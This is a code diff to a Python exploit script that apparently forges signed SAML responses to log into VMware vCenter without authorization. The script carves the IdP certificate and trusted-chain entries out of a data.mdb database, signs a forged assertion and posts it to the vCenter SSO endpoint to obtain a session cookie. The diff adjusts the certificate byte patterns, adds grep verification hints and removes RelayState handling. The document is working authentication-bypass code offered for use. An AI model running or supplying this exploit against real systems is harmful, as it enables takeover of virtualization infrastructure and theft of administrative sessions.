@@ -21,7 +21,10 @@ from dateutil.relativedelta import relativedelta
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 idp_cert_flag = b'\x30\x82\x04'
-trusted_cert1_flag = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
+#Use below if CERTIFICATE: CN=TrustedCertChain-1,CN=TrustedCertificateChains, --> (to verify: strings data.mdb | grep TrustedCert)
+trusted_cert1_flag = b'\x43\x4e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x43\x4e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c'
+#Use below if CERTIFICATE: cn=TrustedCertChain-1,cn=TrustedCertificateChains, --> (to verify: strings data.mdb | grep TrustedCert)
+#trusted_cert1_flag = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c'
 trusted_cert2_flag = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' # \x01\x00\x12TrustedCertChain-1
 not_it_list = [b'Engineering', b'California', b'object']
 
@@ -243,7 +246,7 @@ def saml_request(vcenter):
         sr = parse_qs(o.query)["SAMLRequest"][0]
         dec = base64.decodebytes(sr.encode("utf-8"))
         req = zlib.decompress(dec, -8)
-        return etree.fromstring(req), parse_qs(o.query)["RelayState"][0]
+        return etree.fromstring(req)
     except:
         print(f'[-] Failed initiating SAML request with {vcenter}')
         raise
@@ -285,17 +288,13 @@ def sign_assertion(root, cert1, cert2, key):
         raise
 
 
-def login(vcenter, saml_resp, relaystate):
+def login(vcenter, saml_resp):
     """Log in to the vCenter web UI using the signed response and return a session cookie"""
     try:
         print('[*] Attempting to log into vCenter with the signed SAML request')
         resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)
-
-        if relaystate == None:
-            data = {"SAMLResponse": base64.encodebytes(resp)}
-        else:
-            data = {"SAMLResponse": base64.encodebytes(resp), "RelayState":relaystate}
-
+        data = {"SAMLResponse": base64.encodebytes(resp)}
+        
         r = requests.post(
             f"https://{vcenter}/ui/saml/websso/sso",
             allow_redirects=False,
@@ -351,7 +350,7 @@ if __name__ == '__main__':
     # Generate SAML request
     hostname = get_hostname(args.target)
 
-    req, relaystate = saml_request(args.target)
+    req = saml_request(args.target)
     t = fill_template(hostname, args.target, domain,req)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
-    c = login(args.target, s, relaystate)
+    c = login(args.target, s)
